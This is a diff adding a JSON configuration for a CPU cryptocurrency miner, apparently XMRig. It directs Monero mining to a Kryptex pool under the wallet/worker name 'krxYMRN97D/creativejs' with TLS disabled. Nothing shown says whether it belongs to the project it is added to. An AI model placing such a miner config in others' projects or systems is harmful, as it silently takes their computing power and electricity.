@@ -1,0 +1,19 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "xmr.kryptex.network:8029",
+            "user": "krxYMRN97D/creativejs",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        }
+    ],
+    "print-time": 60,
+    "health-print-time": 60,
+    "retries": 5,
+    "retry-pause": 5
+}
